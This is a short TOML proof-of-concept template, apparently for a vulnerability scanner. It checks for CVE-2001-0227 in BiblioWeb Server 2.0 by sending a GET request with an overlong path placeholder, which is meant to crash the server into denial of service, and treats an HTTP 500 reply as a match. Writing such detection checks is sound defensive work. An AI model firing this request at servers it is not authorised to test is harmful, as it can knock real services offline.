[info]
author = "ave"
description = "验证 BiblioWeb Server 2.0 缓冲区溢出漏洞：发送超长 HTTP GET 请求触发拒绝服务"
id = "POC-AVE-2001-0666"
name = "CVE-2001-0227 PoC"
severity = "medium"
tags = ["ave-2001-0666"]
vuln_id = [
    "CVE-2001-0227",
    "AVE-2001-0666",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{LongPath}}"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [500]
type = "status"
